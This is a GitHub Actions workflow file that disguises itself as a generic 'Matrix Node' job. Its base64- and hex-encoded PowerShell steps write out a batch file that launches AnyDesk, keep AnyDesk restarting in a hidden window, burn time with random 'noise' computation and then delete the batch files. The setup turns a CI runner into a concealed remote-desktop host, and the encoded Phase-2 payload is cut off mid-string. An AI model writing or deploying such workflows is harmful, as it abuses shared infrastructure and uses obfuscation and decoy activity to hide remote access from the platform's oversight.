name: Matrix Node
on: [workflow_dispatch]

jobs:
  node:
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1

      - name: Phase-1
        shell: pwsh
        run: |
          $a = ''

          $b = [System.Convert]::FromBase64String($a)
          $c = [System.Text.Encoding]::UTF8.GetString($b)

          Set-Content -Path 'p1.bat' -Value $c -Encoding Ascii
          cmd /c p1.bat

      - name: Phase-2
        shell: pwsh
        run: |
          $d = 'QGVjaG8gb2ZmCjpTVEFSVF9BTllERVNLCmFueWRlc2sgLS1zdGFydApwb3dlcnNoZWxsIC1Db21tYW5kICJTdGFydC1TbGVlcCAtU2Vjb25kcyA1Igpmb3IgL2YgImRlbGltcz0iICUlaiBpbiAoJyJDOlxQcm9ncmFtRGF0YVxj '

          $e = [System.Convert]::FromBase64String($d)
          $f = [System.Text.Encoding]::UTF8.GetString($e)

          Set-Content -Path 'p2.bat' -Value $f -Encoding Ascii

      - name: Guard
        shell: pwsh
        run: |
          function d($s) {
            $r = ''
            for ($i = 0; $i -lt $s.Length; $i += 2) {
              $r += [char][Convert]::ToInt16($s.Substring($i,2),16)
            }
            return $r
          }

          $n1 = d '416e794465736b'
          $n2 = d '73746172742e626174'

          Write-Host "Guard active - $n1 ← $n2"

          while ($true) {
            if (-not (Get-Process $n1 -EA SilentlyContinue)) {
              if (Test-Path $n2) {
                Write-Host "Restart $n1"
                Start-Process $n2 -WindowStyle Hidden -EA SilentlyContinue
              }
            }
            Start-Sleep -Seconds (300 + (Get-Random -Maximum 360))
          }

      - name: Noise
        shell: pwsh
        run: |
          $lim = Get-Random -Minimum 400000 -Maximum 1100000
          1..$lim | % {
            $null = [Math]::Pow($_ * (Get-Random -Max 100), 2.718 + (Get-Random -Max 1))
            if ($_ % 15000 -eq 0) { Write-Host "n=$_" }
            Start-Sleep -Milliseconds (500 + (Get-Random -Maximum 1400))
          }

      - name: Flush
        if: always()
        shell: pwsh
        run: |
          Remove-Item p*.bat -Force -EA SilentlyContinue
